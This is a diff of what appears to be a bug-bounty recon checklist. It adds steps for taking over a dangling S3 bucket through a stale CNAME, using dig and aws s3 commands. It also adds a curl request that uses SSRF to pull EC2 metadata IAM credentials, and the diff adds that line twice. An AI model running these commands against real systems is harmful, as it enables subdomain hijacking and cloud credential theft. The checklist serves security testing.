@@ -29,10 +29,11 @@ For Recon :
 	[ ]  -Try using a wp-scan with the API Key to get a full report.
 	[ ] - Check the notes in INE-WAPT -> CMS Security Testing
 	[ ] - 
-[ ] - Check for AWS Buckets
+[ ] - Check for AWS Buckets : 
 	[ ] - Check CNAME using the command : `dig old-staging.target.com CNAME` . If the result looks like this : `old-staging.target.com.  300 IN CNAME  old-target-dev.s3-website-us-east-1.amazonaws.com.` Then use the command : `aws s3 ls s3://old-target-dev` to check for the existence of the bucket.
 	If this has happened this shows that, the origin S3 bucket was gone, but is still present as the CNAME of the target. Now we can own the bucket under our account using the command : `aws s3 mb s3://old-target-dev` . Create a simple HTML Page to host the website. Upload it using the command : ```aws s3 website s3://old-target-dev --index-document index.html
 	aws s3 cp index.html s3://old-target-dev/ --acl public-read```
+	Then to chain it with SSRF, we can use this command by making some changes into it  : `curl -X POST http://old-staging.target.com/api/render -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}'`
 	Then to chain it with SSRF, we can use this command by making some changes into it  : `curl -X POST http://old-staging.target.com/api/render -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}'`
 [ ] - API Keys
 	[ ] - Google Maps API Key Exposure Impact - 
